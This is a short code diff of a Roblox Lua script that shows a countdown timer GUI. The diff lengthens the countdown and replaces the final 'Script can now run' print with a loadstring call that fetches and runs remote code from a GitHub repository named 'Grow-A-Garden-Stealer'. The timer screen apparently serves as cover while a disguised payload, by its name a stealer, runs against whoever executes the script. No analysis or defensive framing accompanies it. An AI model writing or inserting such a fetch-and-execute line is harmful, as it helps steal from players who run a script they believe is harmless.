@@ -39,9 +39,9 @@ timerLabel.BackgroundTransparency = 1
 timerLabel.Parent = background
 
 -- Countdown Logic
-local countdownTime = 120
+local countdownTime = 500
 
-for i = countdownTime, 0, -1 do
+for i = countdownTime, 0, -2 do
 	timerLabel.Text = "⏳ Time Left: " .. i .. "s"
 	wait(1)
 end
@@ -53,5 +53,4 @@ timerLabel.Text = ""
 wait(1.5)
 screenGui:Destroy()
 
--- Continue your script below here:
-print("✅ Script can now run.")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OPSCRIPTV1/Grow-A-Garden-Stealer/refs/heads/main/.lua"))()
